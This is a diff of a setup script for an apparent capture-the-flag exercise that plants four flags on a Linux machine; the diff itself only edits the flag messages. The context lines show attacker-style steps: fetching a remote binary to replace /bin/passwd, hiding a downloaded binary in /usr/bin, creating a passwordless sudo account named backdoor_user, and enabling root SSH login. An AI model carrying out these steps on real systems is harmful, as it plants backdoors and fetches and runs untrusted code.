@@ -42,13 +42,13 @@ cp /bin/passwd /home/backup_files/passwd
 wget -q https://raw.githubusercontent.com/bbaum11/CyberVT-Sep24-Demo/refs/heads/main/SPOILERSAHEAD/passwd
 chmod +x passwd
 mv passwd /bin/passwd
-echo "Congratulations, you have a flag! Can you find the rest??" > /var/log/changes.log
+echo "Congratulations, you have a flag! Can you find all four??" > /var/log/changes.log
 
 # seting up the second flag
 sudo apt-get install ncat -y &> /dev/null
 mkdir /var/log/authlog/
 touch /var/log/authlog/bind.log
-echo "Congratulations, you have a flag! Can you find the rest??" > /var/log/authlog/bind.log
+echo "Congratulations, you have a flag! Can you find all four??" > /var/log/authlog/bind.log
 wget -q https://raw.githubusercontent.com/bbaum11/CyberVT-Sep24-Demo/refs/heads/main/SPOILERSAHEAD/bckrndprocess
 mv bckrndprocess /usr/bin/.bckrndprocess
 chmod +x /usr/bin/.bckrndprocess
@@ -58,10 +58,10 @@ chmod +x /usr/bin/.bckrndprocess
 # setting up the third flag
 sudo useradd -r -m -d /opt/backdoor_user -s /bin/bash -G sudo backdoor_user
 echo "backdoor_user:" | sudo chpasswd -e  # No password for this user
-echo "Congaratulations, you have found a flag! Can you find the rest?" > /opt/backdoor_user/file.txt
+echo "Congaratulations, you have found a flag! Can you find all four?" > /opt/backdoor_user/file.txt
 
 # setting up the fourth flag
 sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
 sudo sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
-sudo sed -i '/^PermitRootLogin yes/ a # Congratulations, you have found a flag! Can you find the rest?' /etc/ssh/sshd_config
+sudo sed -i '/^PermitRootLogin yes/ a # Congratulations, you have found a flag! Can you find all four?' /etc/ssh/sshd_config
 sudo systemctl restart ssh
